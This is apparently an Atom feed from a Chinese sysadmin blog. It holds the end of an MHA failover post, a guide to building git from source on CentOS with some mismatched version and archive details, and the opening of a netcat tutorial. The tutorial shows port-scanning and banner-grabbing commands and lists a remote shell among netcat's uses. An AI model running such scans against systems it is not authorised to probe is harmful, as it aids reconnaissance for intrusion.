--colour=auto keepalived</span><br></pre></td></tr></tbody></table></figure><p></p><h5 id="&#x5728;&#x5207;&#x6362;&#x56DE;&#x6765;&#x5230;old-master&#x63D0;&#x6210;&#x4E3A;master"><a href="#&#x5728;&#x5207;&#x6362;&#x56DE;&#x6765;&#x5230;old-master&#x63D0;&#x6210;&#x4E3A;master" class="headerlink" title="&#x5728;&#x5207;&#x6362;&#x56DE;&#x6765;&#x5230;old_master&#x63D0;&#x6210;&#x4E3A;master"></a>&#x5728;&#x5207;&#x6362;&#x56DE;&#x6765;&#x5230;old_master&#x63D0;&#x6210;&#x4E3A;master</h5><p>&#x6B65;&#x9AA4;&#x6309;&#x7167;&#x4E0A;&#x9762;&#x64CD;&#x4F5C;&#xFF0C;&#x5C31;&#x4E0D;&#x91CD;&#x590D;&#x642C;&#x7816;&#x4E86;&#x3002;</p><h2 id="&#x7ED3;&#x679C;"><a href="#&#x7ED3;&#x679C;" class="headerlink" title="&#x7ED3;&#x679C;"></a>&#x7ED3;&#x679C;</h2><p>MHA &#x9AD8;&#x53EF;&#x7528;&#x96C6;&#x7FA4;&#x5207;&#x6362;&#x6210;&#x529F;&#xFF0C;&#x867D;&#x7136;&#x662F;&#x624B;&#x52A8;MHA failover&#x6D4B;&#x8BD5;&#xFF0C;&#x5E76;&#x4E0D;&#x80FD;&#x4EE3;&#x8868;MHA&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x3002;&#x4EE5;&#x540E;&#x8FD8;&#x4F1A;&#x6309;&#x7167;&#x4E0A;&#x9762;&#x7F29;&#x5199;&#x7684;&#x6B65;&#x9AA4;&#x5728;&#x52A0;&#x4E0A;&#x4E00;&#x5B9A;&#x7684;&#x4E3B;&#x4ECE;&#x6570;&#x636E;&#x540C;&#x6B65;&#x5EF6;&#x8FDF;&#x6765;&#x8FDB;&#x884C;&#x6F14;&#x7EC3;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;a href=&quot;#&amp;#x524D;&amp;#x8A00;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;/a&gt;&amp;#x524D;&amp;#x8A00;&lt;/h2&gt;&lt;p&gt;&amp;#x6628;&amp;#x592
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
      <category term="MHA" scheme="https://jiemin.wang/categories/MySQL/MHA/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
      <category term="MHA" scheme="https://jiemin.wang/tags/MHA/"/>
    
  </entry>
  
  <entry>
    <title>CentOS Install git Source</title>
    <link href="https://jiemin.wang/2019/03/25/git-install/"/>
    <id>https://jiemin.wang/2019/03/25/git-install/</id>
    <published>2019-03-25T05:07:08.000Z</published>
    <updated>2019-03-25T05:48:46.687Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p><a href="https://git-scm.com" target="_blank" rel="noopener">Git</a></p><p>&#x540C;&#x751F;&#x6D3B;&#x4E2D;&#x7684;&#x8BB8;&#x591A;&#x4F1F;&#x5927;&#x4E8B;&#x4EF6;&#x4E00;&#x6837;&#xFF0C;Git &#x8BDE;&#x751F;&#x4E8E;&#x4E00;&#x4E2A;&#x6781;&#x5BCC;&#x7EB7;&#x4E89;&#x5927;&#x4E3E;&#x521B;&#x65B0;&#x7684;&#x5E74;&#x4EE3;&#x3002;Linux &#x5185;&#x6838;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#x6709;&#x7740;&#x4E3A;&#x6570;&#x4F17;&#x5E7F;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x3002;&#x7EDD;&#x5927;&#x591A;&#x6570;&#x7684; Linux &#x5185;&#x6838;&#x7EF4;&#x62A4;&#x5DE5;&#x4F5C;&#x90FD;&#x82B1;&#x5728;&#x4E86;&#x63D0;&#x4EA4;&#x8865;&#x4E01;&#x548C;&#x4FDD;&#x5B58;&#x5F52;&#x6863;&#x7684;&#x7E41;&#x7410;&#x4E8B;&#x52A1;&#x4E0A;&#xFF08;1991&#xFF0D;2002&#x5E74;&#x95F4;&#xFF09;&#x3002;&#x5230; 2002 &#x5E74;&#xFF0C;&#x6574;&#x4E2A;&#x9879;&#x76EE;&#x7EC4;&#x5F00;&#x59CB;&#x542F;&#x7528;&#x5206;&#x5E03;&#x5F0F;&#x7248;&#x672C;&#x63A7;&#x5236;&#x7CFB;&#x7EDF; BitKeeper &#x6765;&#x7BA1;&#x7406;&#x548C;&#x7EF4;&#x62A4;&#x4EE3;&#x7801;&#x3002;<a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">&#x5B98;&#x65B9;&#x6587;&#x6863;</a></p><p>&#x5230;&#x4E86; 2005 &#x5E74;&#xFF0C;&#x5F00;&#x53D1; BitKeeper &#x7684;&#x5546;&#x4E1A;&#x516C;&#x53F8;&#x540C; Linux &#x5185;&#x6838;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x7684;&#x5408;&#x4F5C;&#x5173;&#x7CFB;&#x7ED3;&#x675F;&#xFF0C;&#x4ED6;&#x4EEC;&#x6536;&#x56DE;&#x4E86;&#x514D;&#x8D39;&#x4F7F;&#x7528; BitKeeper &#x7684;&#x6743;&#x529B;&#x3002;&#x8FD9;&#x5C31;&#x8FEB;&#x4F7F; Linux &#x5F00;&#x6E90;&#x793E;&#x533A;&#xFF08;&#x7279;&#x522B;&#x662F; Linux &#x7684;&#x7F14;&#x9020;&#x8005; Linus Torvalds &#xFF09;&#x4E0D;&#x5F97;&#x4E0D;&#x5438;&#x53D6;&#x6559;&#x8BAD;&#xFF0C;&#x53EA;&#x6709;&#x5F00;&#x53D1;&#x4E00;&#x5957;&#x5C5E;&#x4E8E;&#x81EA;&#x5DF1;&#x7684;&#x7248;&#x672C;&#x63A7;&#x5236;&#x7CFB;&#x7EDF;&#x624D;&#x4E0D;&#x81F3;&#x4E8E;&#x91CD;&#x8E48;&#x8986;&#x8F99;&#x3002;&#x4ED6;&#x4EEC;&#x5BF9;&#x65B0;&#x7684;&#x7CFB;&#x7EDF;&#x5236;&#x8BA2;&#x4E86;&#x82E5;&#x5E72;&#x76EE;&#x6807;&#xFF1A;</p><ul><li>&#x901F;&#x5EA6;</li><li>&#x7B80;&#x5355;&#x7684;&#x8BBE;&#x8BA1;</li><li>&#x5BF9;&#x975E;&#x7EBF;&#x6027;&#x5F00;&#x53D1;&#x6A21;&#x5F0F;&#x7684;&#x5F3A;&#x529B;&#x652F;&#x6301;&#xFF08;&#x5141;&#x8BB8;&#x4E0A;&#x5343;&#x4E2A;&#x5E76;&#x884C;&#x5F00;&#x53D1;&#x7684;&#x5206;&#x652F;&#xFF09;</li><li>&#x5B8C;&#x5168;&#x5206;&#x5E03;&#x5F0F;</li><li>&#x6709;&#x80FD;&#x529B;&#x9AD8;&#x6548;&#x7BA1;&#x7406;&#x7C7B;&#x4F3C; Linux &#x5185;&#x6838;&#x4E00;&#x6837;&#x7684;&#x8D85;&#x5927;&#x89C4;&#x6A21;&#x9879;&#x76EE;&#xFF08;&#x901F;&#x5EA6;&#x548C;&#x6570;&#x636E;&#x91CF;&#xFF09;</li></ul><h2 id="&#x5B89;&#x88C5;"><a href="#&#x5B89;&#x88C5;" class="headerlink" title="&#x5B89;&#x88C5;"></a>&#x5B89;&#x88C5;</h2><p>git &#x6E90;&#x7801;&#x5B89;&#x88C5;&#x3002;<a href="https://github.com/git/git/archive/v2.21.0.zip" target="_blank" rel="noopener">&#x4E0B;&#x8F7D;&#x6E90;&#x7801;</a><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wget https://github.com/git/git/archive/v2.21.0.zip</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x89E3;&#x538B;&#x7F29;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tar zxvf v2.21.0.zip</span></span><br><span class="line"><span class="comment"># cd git-2.20.1</span></span><br><span class="line"></span><br><span class="line">&#x7F16;&#x8BD1;&#x547D;&#x4EE4;&#x5982;&#x4E0B;</span><br><span class="line"><span class="comment"># # make prefix=/usr/local/git all</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x9047;&#x5230;&#x8BE5;&#x9519;&#x8BEF;</p><img src="/2019/03/25/git-install/giterror.jpg" title="giterror"><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http.h:6:23: warning: curl/curl.h: No such file or directory</span><br><span class="line">http.h:7:23: warning: curl/easy.h: No such file or directory</span><br><span class="line">&#x2026;&#x2026;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x6267;&#x884C;&#x547D;&#x4EE4;</span><br><span class="line"><span class="comment"># yum install -y curl curl-devel</span></span><br></pre></td></tr></tbody></table></figure><p>&#x91CD;&#x65B0;&#x6267;&#x884C;&#x7F16;&#x8BD1;&#x547D;&#x4EE4;</p><p>&#x53D1;&#x73B0;&#x7F16;&#x8BD1;&#x62A5;&#x9519;</p><img src="/2019/03/25/git-install/giterror2.jpg" title="giterror2"><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">    CC http.o</span><br><span class="line">    CC http-walker.o</span><br><span class="line">    CC http-fetch.o</span><br><span class="line">    LINK git-http-fetch</span><br><span class="line">    CC http-push.o</span><br><span class="line">http-push.c:22:19: warning: expat.h: No such file or directory</span><br><span class="line">http-push.c:830: warning: <span class="built_in">type</span> defaults to &#x2018;int&#x2019; <span class="keyword">in</span> declaration of &#x2018;XML_Char&#x2019;</span><br><span class="line">http-push.c:830: error: expected &#x2018;;&#x2019;, &#x2018;,&#x2019; or &#x2018;)&#x2019; before &#x2018;*&#x2019; token</span><br><span class="line">http-push.c: In <span class="keyword">function</span> &#x2018;lock_remote&#x2019;:</span><br><span class="line">http-push.c:900: error: &#x2018;XML_Parser&#x2019; undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c:900: error: (Each undeclared identifier is reported only once</span><br><span class="line">http-push.c:900: error: <span class="keyword">for</span> each <span class="keyword">function</span> it appears <span class="keyword">in</span>.)</span><br><span class="line">http-push.c:900: error: expected &#x2018;;&#x2019; before &#x2018;parser&#x2019;</span><br><span class="line">http-push.c:907: warning: implicit declaration of <span class="keyword">function</span> &#x2018;XML_SetUserData&#x2019;</span><br><span class="line">http-push.c:907: error: &#x2018;parser&#x2019; undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c:908: warning: implicit declaration of <span class="keyword">function</span> &#x2018;XML_SetElementHandler&#x2019;</span><br><span class="line">http-push.c:910: warning: implicit declaration of <span class="keyword">function</span> &#x2018;XML_SetCharacterDataHandler&#x2019;</span><br><span class="line">http-push.c:910: error: &#x2018;xml_cdata&#x2019; undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c:911: warning: implicit declaration of <span class="keyword">function</span> &#x2018;XML_Parse&#x2019;</span><br><span class="line">http-push.c:916: warning: implicit declaration of <span class="keyword">function</span> &#x2018;XML_ErrorString&#x2019;</span><br><span class="line">http-push.c:917: warning: implicit declaration of <span class="keyword">function</span> &#x2018;XML_GetErrorCode&#x2019;</span><br><span class="line">http-push.c:920: warning: implicit declaration of <span class="keyword">function</span> &#x2018;XML_ParserFree&#x2019;</span><br><span class="line">http-push.c: In <span class="keyword">function</span> &#x2018;remote_ls&#x2019;:</span><br><span class="line">http-push.c:1154: error: &#x2018;XML_Parser&#x2019; undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c:1154: error: expected &#x2018;;&#x2019; before &#x2018;parser&#x2019;</span><br><span class="line">http-push.c:1161: error: &#x2018;parser&#x2019; undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c:1164: error: &#x2018;xml_cdata&#x2019; undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c: In <span class="keyword">function</span> &#x2018;locking_available&#x2019;:</span><br><span class="line">http-push.c:1228: error: &#x2018;XML_Parser&#x2019; undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">http-push.c:1228: error: expected &#x2018;;&#x2019; before &#x2018;parser&#x2019;</span><br><span class="line">http-push.c:1235: error: &#x2018;parser&#x2019; undeclared (first use <span class="keyword">in</span> this <span class="keyword">function</span>)</span><br><span class="line">make: *** [http-push.o] Error 1</span><br></pre></td></tr></tbody></table></figure><p>&#x6267;&#x884C;&#x547D;&#x4EE4;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum install -y expat-devel</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x518D;&#x6B21;&#x91CD;&#x65B0;&#x6267;&#x884C;&#x7F16;&#x8BD1;&#x547D;&#x4EE4;</p><p>&#x53D1;&#x73B0;&#x518D;&#x6B21;&#x62A5;&#x9519;</p><img src="/2019/03/25/git-install/giterror3.jpg" title="giterror3"><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GITGUI_VERSION = 0.21.GITGUI</span><br><span class="line">    * new locations or Tcl/Tk interpreter</span><br><span class="line">    GEN git-gui</span><br><span class="line">    INDEX lib/</span><br><span class="line">    * tclsh failed; using unoptimized loading</span><br><span class="line">    MSGFMT    po/bg.msg make[1]: *** [po/bg.msg] Error 127</span><br><span class="line">make: *** [all] Error 2</span><br></pre></td></tr></tbody></table></figure><p>&#x6267;&#x884C;&#x547D;&#x4EE4;&#x89E3;&#x51B3;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># yum install -y tcl build-essential tk gettext</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x518D;&#x6B21;&#x91CD;&#x65B0;&#x6267;&#x884C;&#x7F16;&#x8BD1;&#x547D;&#x4EE4;</p><p>git&#x6E90;&#x7801;&#x7F16;&#x8BD1;&#x6210;&#x529F;&#x6267;&#x884C;&#x6267;&#x884C;&#x547D;&#x4EE4;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># make prefix=/usr/local/git install</span></span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /usr/local/git/</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">bin  libexec  share</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># cd bin/</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">git  git-cvsserver  gitk  git-receive-pack  git-shell  git-upload-archive  git-upload-pack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ./git --version</span></span><br><span class="line">git version 2.20.1</span><br></pre></td></tr></tbody></table></figure><p>&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;a href=&quot;#&amp;#x524D;&amp;#x8A00;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;/a&gt;&amp;#x524D;&amp;#x8A00;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux Netcat 命令 - 网络中的瑞士军刀</title>
    <link href="https://jiemin.wang/2019/03/25/nc/"/>
    <id>https://jiemin.wang/2019/03/25/nc/</id>
    <published>2019-03-25T01:45:29.000Z</published>
    <updated>2019-04-01T03:45:11.879Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p><a href="http://netcat.sourceforge.net/" target="_blank" rel="noopener">netcat</a>&#x662F;&#x7F51;&#x7EDC;&#x5DE5;&#x5177;&#x4E2D;&#x7684;&#x745E;&#x58EB;&#x519B;&#x5200;&#xFF0C;&#x5B83;&#x80FD;&#x901A;&#x8FC7;TCP&#x548C;UDP&#x5728;&#x7F51;&#x7EDC;&#x4E2D;&#x8BFB;&#x5199;&#x6570;&#x636E;&#x3002;&#x901A;&#x8FC7;&#x4E0E;&#x5176;&#x4ED6;&#x5DE5;&#x5177;&#x7ED3;&#x5408;&#x548C;&#x91CD;&#x5B9A;&#x5411;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x5728;&#x811A;&#x672C;&#x4E2D;&#x4EE5;&#x591A;&#x79CD;&#x65B9;&#x5F0F;&#x4F7F;&#x7528;&#x5B83;&#x3002;&#x4F7F;&#x7528;netcat&#x547D;&#x4EE4;&#x6240;&#x80FD;&#x5B8C;&#x6210;&#x7684;&#x4E8B;&#x60C5;&#x4EE4;&#x4EBA;&#x60CA;&#x8BB6;&#x3002;&#x5B83;&#x7684;<a href="http://netcat.sourceforge.net/download.php" target="_blank" rel="noopener">&#x4E0B;&#x8F7D;&#x5730;&#x5740;</a></p><p>netcat&#x6240;&#x505A;&#x7684;&#x5C31;&#x662F;&#x5728;&#x4E24;&#x53F0;&#x7535;&#x8111;&#x4E4B;&#x95F4;&#x5EFA;&#x7ACB;&#x94FE;&#x63A5;&#x5E76;&#x8FD4;&#x56DE;&#x4E24;&#x4E2A;&#x6570;&#x636E;&#x6D41;&#xFF0C;&#x5728;&#x8FD9;&#x4E4B;&#x540E;&#x6240;&#x80FD;&#x505A;&#x7684;&#x4E8B;&#x5C31;&#x770B;&#x4F60;&#x7684;&#x60F3;&#x50CF;&#x529B;&#x4E86;&#x3002;&#x4F60;&#x80FD;&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#xFF0C;&#x4E0E;&#x670B;&#x53CB;&#x804A;&#x5929;&#xFF0C;&#x4F20;&#x8F93;&#x6D41;&#x5A92;&#x4F53;&#x6216;&#x8005;&#x7528;&#x5B83;&#x4F5C;&#x4E3A;&#x5176;&#x5B83;&#x534F;&#x8BAE;&#x7684;&#x72EC;&#x7ACB;&#x5BA2;&#x6237;&#x7AEF;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ nc -h</span><br><span class="line">usage: nc [-46DdhklnrStUuvzC] [-i interval] [-p source_port]</span><br><span class="line">          [-s source_ip_address] [-T ToS] [-w timeout] [-X proxy_version]</span><br><span class="line">          [-x proxy_address[:port]] [hostname] [port[s]]</span><br><span class="line">        Command Summary:</span><br><span class="line">                -4              Use IPv4</span><br><span class="line">                -6              Use IPv6</span><br><span class="line">                -D              Enable the debug socket option</span><br><span class="line">                -d              Detach from stdin</span><br><span class="line">                -h              This <span class="built_in">help</span> text</span><br><span class="line">                -i secs         Delay interval <span class="keyword">for</span> lines sent, ports scanned</span><br><span class="line">                -k              Keep inbound sockets open <span class="keyword">for</span> multiple connects</span><br><span class="line">                -l              Listen mode, <span class="keyword">for</span> inbound connects</span><br><span class="line">                -n              Suppress name/port resolutions</span><br><span class="line">                -p port         Specify <span class="built_in">local</span> port <span class="keyword">for</span> remote connects</span><br><span class="line">                -r              Randomize remote ports</span><br><span class="line">                -S              Enable the TCP MD5 signature option</span><br><span class="line">                -s addr         Local <span class="built_in">source</span> address</span><br><span class="line">                -T ToS          Set IP Type of Service</span><br><span class="line">                -C              Send CRLF as line-ending</span><br><span class="line">                -t              Answer TELNET negotiation</span><br><span class="line">                -U              Use UNIX domain socket</span><br><span class="line">                -u              UDP mode</span><br><span class="line">                -v              Verbose</span><br><span class="line">                -w secs         Timeout <span class="keyword">for</span> connects and final net reads</span><br><span class="line">                -X proto        Proxy protocol: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span> (SOCKS) or <span class="string">&quot;connect&quot;</span></span><br><span class="line">                -x addr[:port]  Specify proxy address and port</span><br><span class="line">                -z              Zero-I/O mode [used <span class="keyword">for</span> scanning]</span><br><span class="line">        Port numbers can be individual or ranges: lo-hi [inclusive]</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ nc</span><br><span class="line">usage: nc [-46DdhklnrStUuvzC] [-i interval] [-p source_port]</span><br><span class="line">          [-s source_ip_address] [-T ToS] [-w timeout] [-X proxy_version]</span><br><span class="line">          [-x proxy_address[:port]] [hostname] [port[s]]</span><br></pre></td></tr></tbody></table></figure><p>nc &#x7684;&#x57FA;&#x672C;&#x529F;&#x80FD;&#x5982;&#x4E0B;&#xFF1A;</p><ul><li>telnet / &#x83B7;&#x53D6;&#x7CFB;&#x7EDF; banner &#x4FE1;&#x606F;</li><li>&#x4F20;&#x8F93;&#x6587;&#x672C;&#x4FE1;&#x606F;</li><li>&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#x548C;&#x76EE;&#x5F55;</li><li>&#x52A0;&#x5BC6;&#x4F20;&#x8F93;&#x6587;&#x4EF6;</li><li>&#x7AEF;&#x53E3;&#x626B;&#x63CF;</li><li>&#x8FDC;&#x7A0B;&#x63A7;&#x5236; / &#x6B63;&#x65B9;&#x5411; shell</li><li>&#x6D41;&#x5A92;&#x4F53;&#x670D;&#x52A1;&#x5668;</li><li>&#x8FDC;&#x7A0B;&#x514B;&#x9686;&#x786C;&#x76D8;</li></ul><h2 id="&#x4F7F;&#x7528;&#x4F8B;&#x5B50;"><a href="#&#x4F7F;&#x7528;&#x4F8B;&#x5B50;" class="headerlink" title="&#x4F7F;&#x7528;&#x4F8B;&#x5B50;"></a>&#x4F7F;&#x7528;&#x4F8B;&#x5B50;</h2><h4 id="&#x7AEF;&#x53E3;&#x626B;&#x63CF;"><a href="#&#x7AEF;&#x53E3;&#x626B;&#x63CF;" class="headerlink" title="&#x7AEF;&#x53E3;&#x626B;&#x63CF;"></a>&#x7AEF;&#x53E3;&#x626B;&#x63CF;</h4><p>&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x7ECF;&#x5E38;&#x88AB;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x548C;&#x9ED1;&#x5BA2;&#x7528;&#x6765;&#x53D1;&#x73B0;&#x5728;&#x4E00;&#x4E9B;&#x673A;&#x5668;&#x4E0A;&#x5F00;&#x653E;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x5E2E;&#x52A9;&#x4ED6;&#x4EEC;&#x8BC6;&#x522B;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6F0F;&#x6D1E;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -z -v -n 192.168.10.10 10-100</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EF;&#x4EE5;&#x8FD0;&#x884C;&#x5728;TCP&#x6216;&#x8005;UDP&#x6A21;&#x5F0F;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;TCP&#xFF0C;-u&#x53C2;&#x6570;&#x8C03;&#x6574;&#x4E3A;udp.</p><ul><li>z &#x53C2;&#x6570;&#x544A;&#x8BC9;netcat&#x4F7F;&#x7528;0 IO,&#x8FDE;&#x63A5;&#x6210;&#x529F;&#x540E;&#x7ACB;&#x5373;&#x5173;&#x95ED;&#x8FDE;&#x63A5;&#xFF0C; &#x4E0D;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x4EA4;&#x6362;</li><li>v &#x53C2;&#x6570;&#x6307;&#x4F7F;&#x7528;&#x5197;&#x4F59;&#x9009;&#x9879;&#xFF08;&#x8BD1;&#x8005;&#x6CE8;&#xFF1A;&#x5373;&#x8BE6;&#x7EC6;&#x8F93;&#x51FA;&#xFF09;</li><li>n &#x53C2;&#x6570;&#x544A;&#x8BC9;netcat &#x4E0D;&#x8981;&#x4F7F;&#x7528;DNS&#x53CD;&#x5411;&#x67E5;&#x8BE2;IP&#x5730;&#x5740;&#x7684;&#x57DF;&#x540D;</li></ul><p>&#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x4F1A;&#x6253;&#x5370;21&#x5230;25 &#x6240;&#x6709;&#x5F00;&#x653E;&#x7684;&#x7AEF;&#x53E3;&#x3002;Banner&#x662F;&#x4E00;&#x4E2A;&#x6587;&#x672C;&#xFF0C;Banner&#x662F;&#x4E00;&#x4E2A;&#x4F60;&#x8FDE;&#x63A5;&#x7684;&#x670D;&#x52A1;&#x53D1;&#x9001;&#x7ED9;&#x4F60;&#x7684;&#x6587;&#x672C;&#x4FE1;&#x606F;&#x3002;&#x5F53;&#x4F60;&#x8BD5;&#x56FE;&#x9274;&#x522B;&#x6F0F;&#x6D1E;&#x6216;&#x8005;&#x670D;&#x52A1;&#x7684;&#x7C7B;&#x578B;&#x548C;&#x7248;&#x672C;&#x7684;&#x65F6;&#x5019;&#xFF0C;Banner&#x4FE1;&#x606F;&#x662F;&#x975E;&#x5E38;&#x6709;&#x7528;&#x7684;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7684;&#x670D;&#x52A1;&#x90FD;&#x4F1A;&#x53D1;&#x9001;banner&#x3002;</p><p>&#x4E00;&#x65E6;&#x4F60;&#x53D1;&#x73B0;&#x5F00;&#x653E;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x5BB9;&#x6613;&#x7684;&#x4F7F;&#x7528;netcat &#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x6293;&#x53D6;&#x4ED6;&#x4EEC;&#x7684;banner&#x3002;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -v 192.168.10.10 22</span><br></pre></td></tr></tbody></table></figure><p>netcat 